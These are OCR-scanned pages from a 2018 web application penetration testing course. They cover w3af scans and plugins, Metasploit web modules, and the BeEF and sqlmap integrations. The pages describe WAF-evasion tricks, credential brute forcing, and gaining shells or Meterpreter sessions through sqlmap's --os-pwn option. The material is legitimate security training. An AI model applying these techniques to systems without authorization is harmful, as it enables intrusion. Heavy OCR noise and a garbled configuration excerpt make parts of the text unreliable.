o Similar to the Metasploit console 
• As we move through the system, the 
prompt changes to signify what area of 
the scan configuration we are in 
• We can select various plugins and set 
their configuration 
• Output is considered a plugin 
o Text File 
o Console 
o HTML File 
+ )( 
l~;,~i! 
[-l$ cd /opt/w3af 
[/opt/W3af l $ . /w3af con so le 
w3af>>> plugins 
·· 
·3af/pluginsn> output console 
w3af / p lugins>>> 
1w3at /plug ins;,:,> audit os ... commanding 
,13af /plugins>>> 
W3af /plugins>>> audit sql.i 
,w3a f /p lugins>>> 
w3af /plugins>>> bad; 
w3af>>> 
w3af>>> target 
!W3af /conf ig :target>>> 
W3af I cont ig: target>» set target http:/ /WWW. sec542. org 
w3af /con fig :target>>> 
H3af/config:target>>> back 
IThe configuration has been saved. 
w3af>>> 
1w3af>>> start 
'scan finished in 3 seconds. 
Stopping the core ... 
lw3af>>> I 
'---' 
'-./ 
'---' 
'---' 
'---' 
'-../ 
'-../ 
'---' 
'-' 
.__., 
'---' 
'---' 
'-.J 
'-.._/ 
'---' 
'---' 
On this screen, we see the console version ofw3af. This console is reminiscent of the Metasploit console and is 
used in the same way. The console provides a pseudo-shell. As we type in commands and select sections, the 
prompt changes to reflect where we are currently. 
A simple scan would look like: 
$ cd /opt/w3af 
$ 
./w3af console 
w3af>>> plugins 
w3af/plugins>>> output console 
w3af/plugins>>> audit os coIIUllanding 
w3af/plugins>>> audit sqli 
w3af/plugins>>> back 
w3af>>> target 
w3af/config:target>>> set target http://www.sec542.org 
w3af/config:target>>> back 
The configuration has been saved. 
w3af>>> start 
Scan finished in 3 seconds. 
Stopping the core ... 
w3af>>> 
48 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'--" 
'-.J 
'--" 
'-../ 
'---' 
'---' 
'-' 
'---' 
'---' 
'--" 
'---' 
'---' 
'-.../ 
'---' 
'---' 
'--" 
'-../ 
'---' 
'-../ 
'--" 
'---' 
'-' 
~ 
wlaf Scripting 
• One of the powers of the console version is its capability to be 
used in a script 
• Simply enter each command into a file as we would in the console 
oFor example: w3af/plugins>>> crawl serverHeader 
o ... would be crawl serverHeader in the script file 
• This file is then loaded into the command line of the console: 
$ w3af console -s filename 
• We typically have a series of files that call different plugins and 
configurations 
o We then iterate through them using a script 
The console interface to w3af also supports scripting. We can put all the commands and options we would 
enter in the console into a text file. We then load this file using the -s option to w3af_console. w3afthen reads 
each line, which contains one command, and processes it. 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
49 
'-' 
w3.af Plugins 
• There are a variety of plugins available within wgaf 
• These plugins are Python scripts that use the wgaf 
framework 
• Plugins get updated quite often, so check for new ones 
• Be judicious in enabling the various plugins 
o Greatly impacts the success and speed of the test performed 
'--" 
'--' 
'--' 
.__,, 
'--' 
'--' 
'--' 
.__,, 
'--' 
'--' 
'--' 
.__,, 
'-...J 
'--' 
'--' 
'--' 
'--' 
At the heart of w3af is its plugin environment. Plugins, written in Python, are the primary way a web application 
penetration tester can focus the testing performed by w3af. Tweaking the plugins to fine-tune the tests 
performed increases the likelihood of successful completion. 
w3af also provides the facility to save the current plugin configurations as a scan profile. This allows for 
repeatable testing processes and eases the phased approach to automated application testing previously 
discussed. Given the importance of the plugins, be sure to keep up to date with new plugins being released or 
updated. 
50 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'--' 
'-...J 
'-...J 
'-...J 
'--' 
'--' 
'--' 
'--' 
'--' 
.__,, 
'---' 
'---' 
'--' 
'--' 
'--' 
'--' 
'-...J 
'--' 
'-...J 
'--" 
'--' 
'---' 
wlaf Crawl Plugins 
• Crawl plugins are used to find 
information regarding the 
application 
o wgaf contains a number of plugins that 
are designed to gather information 
o Spidering is selected within this set of 
plugins 
• The spider_man plugin proves 
particularly useful by instantiating a 
proxy and allowing us to guide wgaf 
via a browser 
o Especially useful for AJAX, Java, or 
Flash-heavy applications 
• Some example discovery plugins 
are: 
o Robots Reader 
• Reads and reports on the robots.txt file 
o Detect Transparent Proxy 
• Uses TRACE method to find proxies 
o Google Spider 
• Spiders the target using content from Google 
cache 
w3af divides the plugins into different categories. The first is crawl. Crawl plugins gather information about the 
application and the server running it. They cover both the recon and mapping steps in our methodology. 
Crawl plugins do various things such as spider the website, both by requesting the page and using Google. They 
also have features such as reading the robots.txt file and detecting transparent proxies. 
The data found here is used by the other plugins. 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
51 
'-,I 
'-../ 
w3af Evasion Pltigins 
Evasion plugins are used in combination with any plugin that sends 
traffic to the site 
• They perform various changes to the request to attempt to evade detection or 
prevention techniques 
• As testers, our main focus here is on evading prevention techniques 
Some examples are: 
• Modifications that bypass typical mod_security installations 
• Adding self-referential directories to the URL: 
o http://www.sec542.org/./cgi-bin/./script.pl 
• Using hex encoding 
• Changing the case of letters randomly 
'--' 
'-../ 
,_,. 
'---" 
'-' 
'---" 
'-'' 
.____, 
'--' 
.__,, 
'--' 
'---" 
'---" 
'-../ 
'---" 
'-../ 
Evasion plugins are used in combination with the other plugins. They change the way that requests are made. 
For example, there is an evasion plugin that encodes parts of the request. These evasion techniques are used to 
bypass infrastructure items such as web app firewalls and filtering logic within the application or server. 
52 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'-../ 
'--' 
'-../ 
'-../ 
'-../ 
'---" 
'--' 
'---" 
'-../ 
'-../ 
'----' 
"---- 
"-'' 
'--' 
'---' 
'-../ 
'---" 
'-" 
'-../ 
'---" 
'-../ 
\..__,, 
w3af Audit Plugins 
Audit plugins are used to find 
various flaws 
• Audit plugins directly map to the 
discovery phase in our methodology 
• They try to find flaws such as: 
oXSS 
o SQL injection 
o Response splitting 
• These plugins build from the 
information gathered using the 
crawl plugins 
Some examples of audit plugins 
are: 
• sslCertificate 
o Finds issues with SSL configurations 
• unSSL 
o Determines if SSL content is available 
viaHTIP 
• osCommanding 
o Attempts to find command injection 
flaws 
Audit plugins correspond to the discovery step in our methodology. This category ofplugins attempts to find the 
various flaws in an application that we can exploit for further access or data. There are audit plugins that cover 
every major type of web application flaw including XSS, SQL injection, and CSRF. These plugins feed data to 
the exploitation plugins we will discuss in a bit. 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
53 
'---" 
'--" 
'Wlaf Grep ... Plugins 
• The next type of plugins we 
discuss are grep or search 
plugins 
o Names grep from the UNIX 
command 
• These plugins are used to find 
items of interest in the results 
from all the other requests 
o Each plugin request results in 
some form of response 
o These search those responses 
• The results of grep plugins also 
act as input to other plugins 
o getMails will be used in the brute 
force attempts 
• Some examples of grep plugins 
are: 
o Path disclosure 
o Code being disclosed 
oAJAXcode 
o Email addresses 
o wgaf can even determine the 
language used in the site 
'---' 
'---' 
'---' 
'---' 
.._,,, 
'---" 
.._,,, 
'---' 
.._,,, 
.._,,, 
.._,,, 
'-----' 
'-----' 
'-----' 
Grep plugins are used to search for items of interest in the responses from the web application. For example, we 
can ask w3afto find signs of code or paths being disclosed. We can also gather email addresses and AJAX code 
snippets used in the application. All this information is then available to other plugins. For example, the 
getMails plugin feeds the brute force plugins. 
54 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'-----' 
'-----' 
'--' 
'---' 
'---' 
'--' 
'-----' 
'--' 
.._,,, 
'-----' 
'--' 
'--' 
'--' 
.._,,, 
.._,,, 
'--' 
'--.../ 
'--.../ 
'--' 
'--.../ 
'-----" 
.._,,, 
'-----" 
'-----" 
'--' 
'----' 
wlaf Brute Force Plugins 
• Brute force plugins are used to find credentials for the site 
• The brute force plugins base can use information 
gathered by the other plugins: 
o Emails gathered-ean be used as usernames · · -- 
o Words from the site can be used as passwords 
• Currently, the brute force plugins are available for: 
o Forms-based authentication 
o HTTP Basic authentication 
SEC542 jWebApp Penetranon Iestlngand Ethical Hacking 
ss 
The brute force plugins attempt to guess authentication credentials for the web application. Currently, there are 
two plugins in this category: Basic and forms. They use data gathered from the other plugins to guess 
credentials, such as email addresses for usernames and words used in the site as passwords. 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
55 
'--' 
'--' 
First, enter the URL to start the test 
from 
• One URL is the limit 
Create a Profile: 
• Select which plugins to use 
• Select output 
• Make sure that in the configuration of 
the spider, you limit it to the target 
Click Start 
'--' 
'--' 
'-.../ 
'-.../ 
'-.../ 
'---" 
'-.../ 
'---' 
'-../ 
'---" 
'---" 
'---" 
'-' 
To start a scan, the tester needs to enter in a URL. As we discussed earlier, this URL can be as complex as 
needed. You can then either select an existing profile that has certain plugins selected or create a specific profile 
for this test. When I perform a scan, I personally like to create a profile for this specific scan. Even if it is similar 
or the same as another profile, it allows me to ensure I keep things separate. 
56 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'-.../ 
'-' 
'-' 
'---' 
'---" 
'---' 
'-../ 
'-.../ 
'-.../ 
'---" 
'---" 
'---' 
'---' 
'---' 
'-.../ 
'-...-/ 
'-...-/ 
'-...-/ 
~ 
'---' 
'-.../ 
'---' 
'---' 
"-' 
'---' 
'-./ 
w3af Results 
• Any potential vulnerabilities are 
listed here for review 
• The full response content is 
captured and viewable for 
detailed analysis: 
oRaw 
oRendered 
• The results can also be searched 
for interesting strings 
After the scan runs, the results show up on this screen. The tester can see all the requests that were considered 
"interesting." Both the request from the client and the response from the server are visible. This allows the tester 
to verify the results. 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
57 
'-' 
'----' 
After the scan, wgaf offers functionality to exploit 
discovered flaws 
• Exploits are available based on results of the scan 
Depending on the discovered flaw, these features can 
be used to: 
• Get command shell access of target web server 
• Interact with a command shell on a database server using 
sqlmap 
• Numerous other possibilities 
wgaf thus partially automates the last step of our 
testing methodology 
58 
03V 
ewl 
file_up!oad 
!ocalJi!e_reader 
os_commanding 
rfi 
'--./ 
'----' 
'--./ 
w3af also handles the exploitation phase of the test. This will be covered more later in class, but we want to 
mention that it was available within the same tool used for discovery. 
w3afincludes quite a few powerful exploitation options. Most of these are focused on providing a shell either on 
the web server or on database servers behind it. 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'--./ 
'--./ 
'--./ 
'--./ 
'--./ 
'--./ 
'--./ 
'--./ 
'--./ 
'--./ 
'-' 
'--./ 
'--./ 
'--./ 
'--./ 
'--./ 
'--../ 
'--./ 
'--./ 
'----' 
'--../ 
'--./ 
'--./ 
'--./ 
'--../ 
'--./ 
'--../ 
'--./ 
'--./ 
'--./ 
'--../ 
'--../ 
'--./ 
'--./ 
'--./ 
\,J 
\,J 
Course Roadmap 
• Day 1: Introduction and Information 
Gathering 
• Day 2: Configuration, Identity, and 
Authorization Testing 
• Day 3: Injection 
• Day 4: XXE and XSS 
• Day 5: CSRF, Logic Flaws, and 
Advanced Tools 
• Day 6: Capture the Flag 
CSRF, LOGIC FLAWS,AND ADVANCED TOOLS 
I. Cross-Site Request forgery 
2. Exercise: CSRF 
3. Logic Attacks 
4. Exercise: Mobile MITM 
S. Python for Web App Pen Testers 
6. Exercise: Python 
7. WPScan 
]!'."Exercise: WPScan 
9. wlaf 
I 0. Exercise: wlaf 
I. I • Metasploit 
n. Ex?rdse: Metasploit 
13. When Tools fail 
14. Exercise: When Tools Fail 
Pen Testing Methods 
[6. Web App Pen Test Preparation 
17. Reporting 
Presenting 
!8. Summary 
SEC54~JWeb APPPenetratio11Testing and Ethical 
Course Roadmap 
Next up is an exercise with w3af. 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
59 
SEC542 Workbook: wlaf 
~.'r} 
Exercise 5.5: wgaf 
SECS42 I Web App Penetration Testing and Ethical Hacking 
60 
..._,, 
..._,, 
'--' 
'-' 
'--' 
'--' 
'----' 
'--' 
'--' 
'-.../ . 
'--' 
'-..,' 
'--' 
'--' 
'--' 
\,_J 
SEC542 Workbook: w3af 
'--' 
'--' 
Please go to Exercise 5.5 in the 542 Workbook. 
'--' 
\,_J 
'--' 
..___., 
\,_J 
'--' 
'-' 
'--' 
'--' 
'--' 
'-..../ 
'--' 
'--' 
\,_J 
'--' 
'--' 
'-,I 
'--" 
60 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'-' 
'-' 
Course Roadmap 
• Day 1: Introduction and Information 
Gathering 
• Day 2: Configuration, Identity, and 
Authorization Testing 
• Day 3: Injection 
• Day 4: XXE and XSS 
• Day 5: CSRF, Logic Flaws, and 
Advanced Tools 
• Day 6: Capture the Flag 
CSRF, LOGIC FLAWS,AND ADVANCED TOOLS 
I. Cross-Site Request Porgery 
l. Exercise: CSRF 
3. Logic Attacks 
4. Exerdse: Mobile HJTH 
5. Python for Web App Pen Testel"5 
6. E.l(ercise: Python 
7. WPScan 
I. Exel'cdse: WPScan 
9. wlaf 
I 0. liixe11cise: wlaf 
11. Metasploit 
12. Ebrercise: Metasploit 
13. When Tools Fail 
14. Exercise: When Tools fail 
15. Pen Testing Method!.: 
16. Web App f'e11 Test Preparation 
17. Reporting and Presenting 
I 8. Summ:iry 
Course Roadmap 
We will next discuss Metasploit, a wonderfully powerful tool that is often overlooked by web application 
penetration testers. 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
61 
'--' 
\._./ 
• The most popular exploitation framework 
o Both commercial and open source options exist 
o Largest Ruby project in existence 
• Most commonly associated with network and general system exploitation 
• Leverages a modular approach that, for 
instance, separates exploits from 
payloads 
• Also, includes auxiliary modules that 
perform a specific task or provide one- 
off functionality 
,+ -- 
rtEta-sµlolt 
1619 exploits • 926 auxiliary - 282 post 
471 payloads - 39 encoders - 9 noes 
J 
Free Metasploit Pro trial: http://r-7.co/trymsp ) 
msf > !! 
\.._., 
'-..../ 
'--' 
'--' 
'--' 
'--' 
'--' 
'-' 
'--' 
'--' 
'-..../ 
'--' 
'-./ 
'-' 
Without question, Metasploit is the most popular exploitation framework in the world. It also happens to be the 
single largest Ruby project in the world. Metasploit facilitates the exploitation of known vulnerabilities and also 
more efficient development of exploits and supporting code. 
Most importantly, Metasploit derives tremendous benefit from its modular architecture. Metasploit separates 
exploits from payloads. Most attacks involve selecting an exploit that abuses a vulnerability and choosing an 
appropriate payload that delivers the impact (for example, command execution, a shell, and a VNC connection). 
Beyond exploits and payloads, Metasploit also includes other types of modules, most importantly, the auxiliary 
modules, some of which we discuss shortly from the web app testing perspective. 
62 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'--' 
'--' 
'--' 
'-' 
\..J 
'--' 
'--' 
'--' 
'--' 
'-' 
'--' 
'--' 
'-' 
'--' 
'--' 
'--' 
'--' 
'--' 
'--' 
'-' 
'--' 
'-' 
\..J 
\..J 
'-' 
\..J 
Metasploit and Web "Testing 
• Well known for network penetration, Metasploit includes significant web 
testing capabilities 
o Especially for testing off-the-shelf rather than custom software 
o Numerous relevant exploits for Wordpress, Joomla, Drupal, Oracle DB, SQL Server, 
SCADA web frontends, and many others 
• Can greatly ease exploitation, and especially post-exploitation.of known 
vulnerabilities for which there is an exploit module 
• In addition to exploitation, many auxiliary modules can perform relevant 
functions such as scanning (discovery), crawling/spidering, and querying 
basic web server 
• >150 entries under auxiliary/scanner/http/ 
Although most well known for its tremendous network penetration, Metasploit includes significant web testing 
capabilities. This is especially true for exploitation of known vulnerabilities in off-the-shelf web applications 
and other supporting services that comprise the web application infrastructure. 
Even if an engagement is primarily focused purely on custom application testing, there are almost always 
elements that could include known vulnerabilities, and therein exploits. 
Beyond direct exploitation using Metasploit, there are also numerous auxiliary modules. The purpose of these 
modules can vary greatly. A great number of them are associated with determining if a particular vulnerability is 
present. The vulnerability discovery modules typically are found under auxiliary/ scanner. Note that 
there are more than 150 unique entries within auxiliary/scanner/http. 
Vulnerability discovery notwithstanding, there are auxiliary modules that can even serve as a web 
crawler/spider, and others that can aid in gathering information that would easily fall under the mapping portion 
of our methodology. 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
63 
'--' 
\..._,I 
\ ... ,: 
Seeding. Metasploit Database 
• Metasploit's database backend makes using its web goodness far more efficient 
• So, how do we get target, url, form information into the database? 
o Manually ... um, no thank you 
o Spidering from Metasploit (crawlers) 
o Importing from another tool 
• Metasploit has two basic spiders: 
o auxiliary/crawler/msfcrawler 
o auxiliary/scanner/http/crawler 
Name 
• Although these spiders/ crawlers might 
be great, they are not a replacement 
for Burp or ZAP's capabilities 
• Even if the spiders were fully featured, it would still mean duplication of effort and requests 
auxi Ua ry / sea nne r /!lttp/ crawler 
explo1t/w1ndows/mssqltmssql_(1nkcrawler 
'-../ 
'-../ 
'-' 
'-../ 
'-../ 
'-.../ 
'-../ 
'-' 
'-' 
'-' 
'-' 
'-' 
'-.../ 
As web application penetration testers, it is unlikely that Metasploit is the first tool we would have used during 
an engagement. Actually, we would have likely done a lot of application mapping and vulnerability discovery 
before needing to leverage Metasploit. 
Metasploit includes a backend database that can make launching modules against large volumes of targets much 
easier. Assuming that Metasploit includes relevant web application testing capabilities we want to make use of, 
how would we go about porting our targeting information to Metasploit's database? Manually by hand is 
certainly an option, but not if we want to run a module against a large number of sites, or worse yet against 
every form or query from every site. 
Many folks are surprised to learn that Metasploit includes its own application spidering/crawling capabilities. 
Two distinct auxiliary modules can crawl sites for us. The two crawlers are: 
auxiliary/crawler/msfcrawler 
• 
auxiliary/scanner/http/crawler 
These two are not serviceable replacements for Burp or ZAP, but be aware of this as a potential feature to 
employ when needed. Beyond their lack of comparable functionality compared to ZAP or Burp, employing 
these two spiders would mean crawling the applications yet again, which we have likely done many times by 
this point. 
No, we need a better way to get information from our existing tools into Metasploit. 
64 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'-' 
'-.../ 
'-' 
'-.../ 
'-.../ 
'-../ 
'-" 
'-' 
'-../ 
'-" 
'-.../ 
'-" 
'-...,,' 
'-' 
'-...,,' 
'-../ 
'-../ 
'-../ 
'-../ 
'-' 
'-' 
'-' 
'-' 
'-' 
'-' 
db_import 
• The most efficient way to prime Metasploit' s 
database for use is with db import 
• Metasploit's db_ import ingests certain tools' 
output files and parses them into its own 
database structure 
• Eases bringing external tools' output into 
Metasploit 
o Output file format has to be supported 
o db_ import -h can provide a list of supported files 
and their expected format 
• Many overtly web-relevant tools are supported 
fmmdstone 
flw,.J.11;10..-.t :<Ml 
IP Addr'eU t.a.sr 
IP3&0 ASPL 
r,:,.11ut XML v3 
Libpc:.ap Packet Capture 
Ntuplo.1 t PWOump Expo-rt 
tlitttH'l)\Oit XMt. 
Mtita:s:ploit np expurt 
•Uuo,ott fl.lHli•• Security Analyzer 
liltXpo~• S.i•ph• XML 
Nd:pos~ XML M;e,p(U"t 
t4eiuu, RSE ,..port 
'4e~&U¾ XXL I vl) 
,. 
To avoid wasting time duplicating targets already acquired, sites already spidered, and forced browsing already 
performed, we can employ db_ import. From within Metasploit, this Metasploit command enables us to ingest 
output files from other tools. The output file in question needs to be one that is supported already by 
db import or might require processing to get it into a format consumable by db_ import. 
Although db_ import naturally does not cover every tool that we might employ as web application penetration 
testers, it does have fairly substantial web tool coverage. Simply running db_ import -h can provide a list of 
the currently supported types of files. 
Many general-purpose vulnerability scanners are represented, but there are overtly web relevant tools in the list 
as well. Acunetix, AppScan, Burp, NetSparker, Nikto, and Wapiti all make the cut. Again, we don't get 
complete coverage of all our tools; however, the list of supported tools is substantial. 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
65 
\,_,, 
\,_,, 
• Web Scanning plugin built in to Metasploit 
o Written by Efrain Torres (@etlow) 
I 
I 
I II 
I 
I 
11 
I 
11 
I - I 
"- 
:t~_,_r_t' A 
t' 
l 
o Last updated in 2012 but still can prove useful 
• Interfaces with the Metasploit backend database to ease 
both finding targets and reporting 
• WMAP launches Metasploit auxiliary and exploit 
modules related to web applications storing results in 
the database 
• A custom profile enabling different modules to run can 
be created: 
o Use the sample profile wmap_sample_profile.txt as a 
starting point to build the custom WMAP scan 
configuration 
• Builds upon key modules in auxiliary/scanner/http 
66 
" 
) 
I 
I !) 
I 
I !! 
., 
II I 
[WMAP Ls .1 J == et [ 
J metasploit com 2e12 
[kJ successrut ty loaded p1ugin: wmap 
mu > help 
wmap commands 
command 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
Description 
wmap modules 
Manage wmap modules 
wmap = nodes 
Manage nodes 
wmap nm 
Test targets 
wmav :: sites 
Manage sites 
wmaptargets 
Manage targets 
wmap~vulns 
Display web vutns 
'-..,I 
'-.J 
'----' 
'----' 
___, 
--=,~~-,,H.. 
- 
- 
./ **''"~'°'- ~ ,~ :~ 'f'7'"ts~~ff~;-r~~ ff00'~ 
"'""''=~-= 
Beyond the individual auxiliary and exploit modules that fall within our purview, Metasploit includes a plugin from 
Efrain Torres (@etlow) called WMAP. This plugin, which does not see a lot of active development at present, 
serves as an interface to Metasploit's individual web-related modules. However, it does more than just simply run a 
number of different modules against a defined target; it also brings with it direct Metasploit database integration 
and extension. 
Efrain Torres' initial release and associated DefCon presentation on WMAP, although detailing a former 
architecture of the tool, could still be useful reading.1 
A relative dearth of supporting documentation for WMAP exists. The best source of documentation comes from the 
documentation text file that was previously distributed as part of the Metasploit framework. Unfortunately, the file 
is no longer in the current version of the GitHub repository. Fortunately, we can go back in time to find it.2 
References: 
[l] https://www.defcon.org/images/defcon- l 7 /dc-17-presentations/defcon- l 7-efrain _torres- 
metasploit_goes _ web.pdf (https://cyber.gd/542 _512) 
[2] https://github.com/rapid7/metasploit- 
framework/blob/8909ad l 2ba83b22b90c 1968 l 599 l 8 l 7f70530ae5/documentation/wmap.txt 
(https://cyber.gd/542 _511) QR 
___, 
'-.J 
___, 
'--./ 
'----' 
'----' 
\_,, 
'--./ 
___, 
'--./ 
'--./ 
'--./ 
'--./ 
'-.J 
'-.J 
'----' 
'-' 
'-' 
'--./ 
'----' 
'--./ 
'----' 
'-.J 
'----' 
'-../ 
'-.J 
'-.J 
'-../ 
'-../ 
'-../ 
'-.J 
'--./ 
\...; 
'-../ 
'----' 
Metasploit Integration 
• Many tools work to integrate directly with Metasploit 
• Integration often seeks to benefit from types of modules beyond 
the scope of the original tool 
oA common example would be vulnerability scanning/discovery tools 
attempting to facilitate exploitation 
• The simplest form of integration is leveraging db_ import to 
expose tool data to Metasploit 
• Deeper integration might be wanted in some circumstances to 
allow the tool to make use of Metasploit directly 
o Rather than requiring users to import their tool's output into Metasploit's 
database for use 
Due to the popularity, quality, and open source nature ofMetasploit, many other security tools attempt to 
integrate with Metasploit. This is particularly common if a tool aids discovery of vulnerabilities and wants to 
bolster its exploitation and post-exploitation capabilities. 
Some integration is simply from the vantage of the previously discussed db_ import consuming the tool 
output, enabling a Metasploit user to leverage this data. Although this can be extremely valuable, some tools 
want deeper integration to allow for Metasploit to be called directly from their tool. Now, look at a few of our 
tools that seek that more robust integration of Metasploit. 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
67 
'-- 
• The use of an exploitation 
framework, such as BeEF, greatly 
expands the capabilities for 
weaponizing XSS to cause impact 
• However, as robust as it is, simply 
having a hooked browser generally 
affords us only: 
o Limited privileges on the system 
o Poor chances of persistence 
• A hooked browser does provide a 
wealth of information about the 
browsing environment (browser, 
plugins, and such): 
o Details that could indicate the existence 
of exploitable vulnerabilities 
o Or capabilities that could be abused to 
go beyond simply browser-level access 
• Exploiting those capabilities or even 
vulnerabilities goes beyond BeEF's 
standard functionality 
• Therefore, the BeEF project sought 
to integrate Metasploit to gain this 
type of functionality 
'-.._..; 
'-.._..; 
'-.._..; 
'-..../ 
'-..../ 
\..J 
\..J 
'-..../ 
'-.._..; 
'-J 
\..J 
'-J 
'-J 
'-J 
Exploiting XSS to gain control, or hook, of browsers becomes vastly simpler and more impactful with BeEF. 
Although this is certainly the case, we still have significant limitations for capabilities on the victim. True, we 
can cause potentially devastating impact under the right conditions merely by wielding the browser, but we are 
still severely limited. 
Increasingly browsers are run with limited privileges. As more and more people finally step away (kicking and 
screaming) from their legacy Windows XP boxes, this will become more likely. We are stuck with limited 
privileges on the system. 
Another challenge we face is that hooked browsers are rather ephemeral. If they stop communicating with the 
BeEF controller, we no longer have access. The easiest way for them to stop communicating is to kill the 
browser, and our access has been severed. 
Even with these limitations, the access we gain with BeEF includes a treasure trove of information about its 
browsing environment. This information could potentially disclose exploitable vulnerabilities. Unfortunately, 
exploitation of these vulnerabilities is beyond the scope of standard BeEF functionality. 
Enter Metasploit.1 
'-..../ 
'-J 
'-..../ 
'-- 
'-..../ 
'-..../ 
'-..../ 
'-- 
'-..../ 
'-..../ 
'-- 
'---' 
'--' 
'--' 
'-- 
'--'
Reference: 
[l] https://github.com/beefproject/beef/wiki/Metasploit (https://cyber.gd/542 _522) QR 
68 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'-' 
'-..../ 
\..._.,
'-" 
'-' 
\..._.,
V 
\..J 
\..J 
>!load msgrec ServerHost=127.0.EU Pass=Security542! 
MSGRPC Service: 
127. 0. 0 .1: 55552 
MSGRPC usernane: msf 
MSGRPC Password: security542 
~ 
sucresstuttv loaded ptu in: ms rpc 
~ 
extension: 
requester: 
-enable: true 
proxy: 
enebl.e: true 
k_ey; "btef, k-ey, pem'' 
t_pem· 
extension: 
met asp lo it; 
neee: -nerasoteu : 
enable: true' 
host: ''127.e.o,1~ 
port, 55552 
,, •im t~ 
ass: "Securit 542 
urr , 
a 1 
BeEF has long integrated with Metasploit, previously using different methods, to achieve successful exploitation 
of vulnerabilities on hooked browsers. l Through this integration and exploitation, we could have increased 
privileges and a means to persist the browser being closed, or even the system being rebooted. 
BeEF has done most of the integration work for us. We simply configure BeEF to point at our Metasploit RPC 
listener, and then the BeEF interface exposes Metasploit modules.2 
Follow these steps: 
I. Update the con£ ig. yml file in the beef directory (/ opt/beef in the class VM) to show 
Metasploit is enabled. 
2. Unless already enabled, configure and start a Metasploit RPC instance from within msfconsole by 
typing load msgrpc ServerHost=l27. 0. 0 .1 Pass=Securi ty542 at the prompt. 
3. Update the config. yml file in the extensions/metasploi t directory 
(/opt/beef/extensions/metasploi tin the class VM) with details about a Metasploit RPC 
instance that mirror what was used in step 2. 
4. Start BeEF. 
5. Inject some Metasploit goodness. 
References: 
[I] https://github.corn/beefproject/beef/wiki/Configuration (https://cyber.gd/542 _ 523) QR 
[2] Ibid. 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
69 
'--" 
'--" 
• The integration of sqlmap and Metasploit works two ways 
o sqlmap. py can directly leverage a local Metasploit install (sqlmap + Metasploit) 
• Primary emphasis on using Metasploit for shellcode to achieve a shell, VNC, 
or even Meterpreter session: 
o - -os-pwn: switch causes sqlmap to leverage Metasploit 
o - -priv-esc: Attempts privilege escalation on Windows via Metasploit 
o - -ms f -pa th: Defines local Metasploit install location used 
• Integration also goes the other way (Metasploit + sqlmap) 
• Metasploit ships with a sqlmap plugin that can be loaded 
o This enables a Metasploit user to leverage sqlmap for performing sql injection attacks against 
targets already in Metasploit's database 
'--" 
'--" 
'--" 
'--' 
'--' 
'--' 
'--' 
'--' 
'--" 
'--" 
'--' 
'--' 
'--' 
The integration ofMetasploit and sqlmap is interesting because the integration actually happens from both tools. 
sqlmap integrates with Metasploit and Metasploit integrates with sqlmap. 
sqlmap integrates Metasploit, which is referred to in sqlmap documentation as Takeover Features.1 Metasploit is 
primarily used for the creation of shellcode and establishing an out-of-band C2 ( or command and control) 
channel that doesn't require continuous SQL queries. --os-pwn takes sqlmap's built-in --os-shell capabilities and 
extends them by leveraging Metasploit. --os-pwn enables the attacker to use Metasploit's shell, VNC, or 
Meterpreter payloads and also enables them to be configured to perform reverse connections in which the 
compromised server initiates outbound connections to the adversary. 
Another capability afforded sqlmap through its integration with Metasploit is the ability to have Metasploit 
perform privilege escalation attacks against Windows backends. If successful, this would grant the adversary 
higher privileges than previously achieved through direct SQL injection. 
The --msf-path command simply allows the attacker to supply the path to a local Metasploit installation. 
sqlmap's GitHub repository provides some additional details employing Metasploit from within sqlmap.2 
Although less likely to be used by web application penetration testers, Metasploit also integrates sqlmap, instead 
of sqlmap integrating Metasploit. This means that while working within Metasploit a penetration tester could 
leverage sqlmap without having to exit Metasploit. Fully detailing the use of the sqlmap plugin is beyond our 
scope, as web app testers are less inclined to use Metasploit as their central testing platform. 
I• I~ I• I 
References: 
[ 1] https://github.com/sqlmapproject/sqlmap/wiki/Features (https://cyber.gd/542 _514) QR 
[2] https://github.com/sqlmapproject/sqlmap/wiki/Usage (https:/ /cyber.gd/542 _514) 
70 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'--' 
'-...,I 
'--' 
'--' 
'--' 
'---' 
'--' 
'-.J 
'---' 
'--' 
'--' 
'---' 
'--' 
'--' 
'--' 
'--' 
'-...,I 
'--' 
'--' 
'-...,I 
'-...,I 
'---' 
'-...,I 
'-...,I 
,____, 
'-...,I 
Metasploit and Known Vulnerabilities 
• Our main use case for Metasploit is the exploitation of known vulnerabilities 
• Custom application testing can be facilitated through the use ofWMAP or 
auxiliary modules 
o Still, the main reason to introduce Metasploit to web pen testers is for exploiting 
unpatched apps 
• Some examples of Metasploit web application exploits that might well fall 
within our domain: 
o CMS: WordPress and WP plugins, Joornla, Drupal, and so on 
o Databases MySQL, MS SQL, PostgreSQL, Oracle, and such 
o Specific SQL injection flaws ( ms f> search sqli ) 
o Shellshock, Heartbleed, or Drupalgeddon exploitation 
We typically think of network penetration testers exploiting web servers, instead of web applications. However, 
a huge volume of off-the-shelf web applications can have unpatched flaws, which are the standard fare for 
network penetration testers and for Metasploit. 
Our main use case for Metasploit mirrors that of network pen testers, namely exploitation of known 
vulnerabilities, with the exception that our targets will typically all be related to the web application 
infrastructure. Metasploit includes a tremendous number of web application exploits as part of its exploit 
modules, which is not surprising given how ubiquitous web applications are. 
In addition to the vast number of prepackaged exploits at our disposal, Metasploit does offer us some 
